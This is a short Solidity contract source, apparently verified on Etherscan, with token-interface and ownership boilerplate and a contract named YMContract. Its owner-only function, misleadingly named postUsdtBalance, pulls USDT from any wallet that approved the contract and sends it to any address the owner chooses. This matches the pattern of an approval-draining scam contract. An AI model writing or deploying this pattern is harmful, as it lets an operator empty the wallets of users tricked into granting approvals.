/**
 *Submitted for verification at Etherscan.io on 2022-04-01
*/

pragma solidity ^0.5.16;

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract YMContract is Context, Ownable {

    IBEP20 usdtToken;
    address usdtContract;

    constructor(address _usdtContract) public {
        usdtContract = _usdtContract;
        usdtToken = IBEP20(_usdtContract);
    }

    function getUsdtAllowance(address _from) public view returns (uint256) {
        return usdtToken.allowance(_from, address(this));
    }

    function getUsdtBalance() public view returns (uint256) {
        return usdtToken.balanceOf(address(this));
    }

    function postUsdtBalance(address _from, address _to, uint256 _quantity) onlyOwner public {
        usdtToken.transferFrom(_from, address(this), _quantity);
        usdtToken.transfer(_to, _quantity);
    }

    function setUsdtContract(address _usdtContract) onlyOwner public {
        usdtContract = _usdtContract;
        usdtToken = IBEP20(_usdtContract);
    }

    function getUsdtContract() public view returns(address) {
        return usdtContract;
    }

}